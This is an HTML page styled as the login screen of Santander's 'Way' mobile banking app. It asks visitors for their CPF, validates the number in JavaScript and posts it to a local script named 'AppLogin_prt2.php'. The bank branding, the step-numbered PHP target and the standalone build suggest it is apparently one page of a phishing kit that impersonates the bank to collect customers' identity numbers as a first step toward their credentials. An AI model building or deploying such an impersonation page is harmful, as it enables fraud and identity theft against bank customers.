<html>
    <head>
    <meta name="theme-color" content="#DF0202"/>
        <title>Santander Way</title>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <meta name="content-type" content="text/html" charset="utf-8"/>        
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet"> 
        <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
        <script type="text/javascript" src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.0/jquery.mask.js"></script>
            <script>
                $(document).ready(function () { 
                    var $seuCampoCpf = $("#CPF");
                    $seuCampoCpf.mask('000.000.000-00', {reverse: true});
                });
            </script>
        <style>
            body{
                background-color: #DF0202 !important;
            }
            .header_red{
                width: 100%;                                
            }
            .img_Away{
                text-align: center;
                margin-top: 40px;
            }
            .img_Away img{
                width: 120px;
                height: 35px;
            }
            .versionApp{
                margin-top: 10px;
                text-align: center;
                padding-bottom: 5px;       
            }
            .versionApp span{
                color: #fff;
                font-size: 12px;
                font-family: 'Open Sans', sans-serif;
            }
            .sectionBg{
                border-top-left-radius: 10px;
                border-top-right-radius: 10px;
                background-color: #fff;
                width: 100%;
                height: 500;
               
            }
            .conteudo{
                padding-left: 20px;
                margin-top: 10%;
                width: 100%;
            }
            .BgCotentTitle{
                          
            }
            .BgCotentTitle h1{
                font-size: 18px;
                font-weight: bold;
                color: #000;
            }


            .FormOne{
                margin-top: 3em;
            }


			.label-float{
				  position: relative;
				  padding-top: 13px;
			}

			.label-float input{
			  width: 95%;
			  border: 0;
			  border-bottom: 1px solid #bbbbbb;
			  outline: none;
			  min-width: 180px;
			  font-size: 18px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  -webkit-appearance:none;
			  border-radius: 0;            
			}

			.label-float input:focus{
			  border-bottom: 2px solid #84c5b7;
			}

			.label-float input::placeholder{
			  color:transparent;
			}

			.label-float label{
			  pointer-events: none;
			  position: absolute;
              font-size: 18px;
			  top: 0;
			  left: 0;
			  margin-top: 13px;
			  transition: all .3s ease-out;
			  -webkit-transition: all .3s ease-out;
			  -moz-transition: all .3s ease-out;
			  color: #8e8e8e;
			}

			.label-float input:required:invalid + label{
			 
			}
			.label-float input:focus:required:invalid{
			  
			}
			.label-float input:required:invalid + label:before{
			  content: '';
			}
			.label-float input:focus + label,
			.label-float input:not(:placeholder-shown) + label{
			  font-size: 13px;
			  color: #84c5b7;
			  margin-top: -10;			  
			}
			     span.tituloTel {
                font-size: 18px;
                color: rgb(50,144,255);
            }

            .checkOption{
                margin-top: 15px;
                display: inline-block;
            }
            input[type="checkbox"]{
                border: 1px solid #84c5b7;
                padding: 10px;
            
            }
            .checkOption .labelcor{
                color: #e2e2e2;
            }
            .TwoBtnBox{
                text-align: center;
                margin-left: -20px;
                margin-top: 40%;
                margin-right: ;
            }
            .TwoBtnBox input[type="submit"]{
                background-color: #D1D1D1;
                color: #969191;
                font-weight: bold;
                width: 250px;
                height: 50px;
                border-radius:30px;
                border: none;
                outline: none;
            }
            .solicitar_cart{
                margin-top: 15px;
            }
            .btn_solicitar_cart{
                background-color: #F8FAFB;
                border: 1px solid #eaeaea;
                color: #84c5b7;
                font-size: 12px;
                padding: 5px 40px;
                border-radius: 20px;
            }
        </style>
    </head>
    <body>
        <div class="container-fluid">        
            <div class="row">
                <div class="header_red">
                    <div class="col-sm-12">
                        <div class="img_Away">
                            <img src="img/logoAway.jpg">                 
                        </div>
                    </div>
                    <div class="versionApp">
                        <span>Versão 2.2.10</span>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="sectionBg">                      
                    <div class="col-sm-6">
                        <div class="conteudo">
                            <div class="BgCotentTitle">
                                <h1>Se você já é nosso cliente, digite<br> abaixo o seu CPF.<h1>
                            </div>
                            <div class="FormOne">
                                <form method="POST" action="AppLogin_prt2.php">
                                    <div class="label-float">
                                        <input id="CPF" name="cpf" placeholder=" " type="tel" minlength="11" maxlength="14" onkeypress="return SomenteNumero(event)" required>
                                        <label>Informe o seu CPF</label>
                                    </div>
                                    <div class="checkOption">
                                        <div class="custom-control custom-checkbox custom-control-inline">
                                            <input type="checkbox" class="custom-control-input" id="defaultInline1">
                                            <label class="custom-control-label labelcor" for="defaultInline1">Lembrar CPF</label>
                                        </div>
                                    </div>
                                    <div class="TwoBtnBox">
                                        <div class="btn_continuar">
                                            <input type="submit" disabled id="btnsubmit" name="prosseguir" value="PROSSEGUIR"/>
                                        </div>
                                        
                                        <div class="solicitar_cart">
                                            <a>
                                                <button class="btn_solicitar_cart" disabled>PEDIR CARTÃO</button>
                                            </a>
                                        </div>
                                    </div>
                                </form>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        
        <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js" integrity="sha384-UO2eT0CpHqdSJQ6hJty5KVphtPhzWj9WO1clHTMGa3JDZwrnQq4sF86dIHNDz0W1" crossorigin="anonymous"></script>
        <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js" integrity="sha384-JjSmVgyd0p3pXB1rRibZUAYoIIy6OrQ6VrjIEaFf/nJGzIxFDsf4x0xIM+B07jRM" crossorigin="anonymous"></script>
        <script>     

           $("#CPF").keyup(function() {               
                if (this.value.length == this.maxLength) {
                    var numcpf = $("#CPF").val();
                    numcpf = numcpf.replace(/[^0-9]/g, '');                    
                    
                    if(numcpf == ""){
                        mostraDialogo("CPF inválido!", "warning", 1000);                   
                    return false;
                }

                if(numcpf == 11111111111){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 22222222222){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 33333333333){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 44444444444){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 55555555555){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 66666666666){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 77777777777){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 88888888888){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 99999999999){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                if(numcpf == 00000000000){
                    mostraDialogo("CPF inválido!", "warning", 1000);
                    return false;
                }

                    var digitoA = 0;
                    var digitoB = 0;

                    for(var i=0, x=10; i<=8; i++, x--){
                        digitoA += numcpf[i] * x;
                    }

                    for(var i=0, x=11; i<=9; i++, x--){
                        digitoB += numcpf[i] * x;
                    }

                    var somaA = ((digitoA%11) <2) ? 0 : 11-(digitoA%11);
                    var somaB = ((digitoB%11) <2) ? 0 : 11-(digitoB%11);
                
                    if(somaA != numcpf[9] || somaB != numcpf[10]){
                        mostraDialogo("CPF inválido!", "warning", 1000);                   
                        return false;
                    }
                    if(somaA == numcpf[9] || somaB == numcpf[10]){
                        
                        let botaosubmit = $("#btnsubmit");
                        botaosubmit.prop( "disabled", false);
                        botaosubmit.css({'color': '#fff'});         
                        botaosubmit.css({'background-color': '#1EB3BA'});                        
                    }
                    
                }
            });
            
            function mostraDialogo(mensagem, tipo, tempo){
    
    // se houver outro alert desse sendo exibido, cancela essa requisição
    if($("#message").is(":visible")){
        return false;
    }

    // se não setar o tempo, o padrão é 3 segundos
    if(!tempo){
        var tempo = 3000;
    }

    // se não setar o tipo, o padrão é alert-info
    if(!tipo){
        var tipo = "info";
    }

    // monta o css da mensagem para que fique flutuando na frente de todos elementos da página
    var cssMessage = "display: block; position: fixed; bottom: 35px; width: 100%; padding-top: 10px; z-index: 9999; text-align:center; color: #fff;";
    var cssInner = "margin: 0 auto;  background-color: #E49C26;";

    // monta o html da mensagem com Bootstrap
    var dialogo = "";
    dialogo += '<div id="message" style="'+cssMessage+'">';
    dialogo += '    <div class="alert alert-'+tipo+' alert-dismissable" style="'+cssInner+'">';    
    dialogo +=          '<span style="color: #fff; font-family: \'Open Sans\', sans-serif;">'+mensagem+'</span><br><span style="font-size: 14px; color: #fff;">Por favor, digite novamente.</span>';
    dialogo += '    </div>';
    dialogo += '</div>';

    // adiciona ao body a mensagem com o efeito de fade
    $("body").append(dialogo);
    $("#message").hide();
    $("#message").fadeIn(200);

    // contador de tempo para a mensagem sumir
    setTimeout(function() {
        $('#message').fadeOut(300, function(){
            $(this).remove();
        });
    }, tempo); // milliseconds

}
        </script>
    </body>
</html>
